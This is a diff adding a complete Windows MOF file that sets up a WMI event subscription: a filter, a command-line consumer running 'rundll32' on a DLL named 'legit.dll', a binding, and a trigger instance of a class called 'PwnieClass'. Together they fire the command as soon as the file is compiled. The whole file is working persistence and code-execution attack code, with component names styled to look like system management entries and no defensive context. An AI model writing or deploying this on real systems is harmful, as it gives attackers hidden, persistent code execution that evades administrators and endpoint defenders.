@@ -1,0 +1,34 @@
+#pragma autorecover
+#pragma namespace ("\\\\.\\root\\subscription")
+
+class PwnieClass
+{
+    [key]
+    string Name;
+};
+
+instance of __EventFilter as $FILTER
+{
+    Name = "_SM.EventFilter";
+    EventNamespace = "root\\cimv2";
+    Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \"PwnieClass\"";
+    QueryLanguage = "WQL";
+};
+
+instance of CommandLineEventConsumer as $CONSUMER
+{
+    Name = "_SM.ConsumerScripts";
+    RunInteractively=false;
+    CommandLineTemplate="rundll32 shell32.dll,Control_RunDLL \legit.dll";
+};
+
+instance of __FilterToConsumerBinding
+{
+    Consumer = $CONSUMER ;
+    Filter = $FILTER ;
+};
+
+instance of PwnieClass
+{
+    Name = "Pwnie";
+};
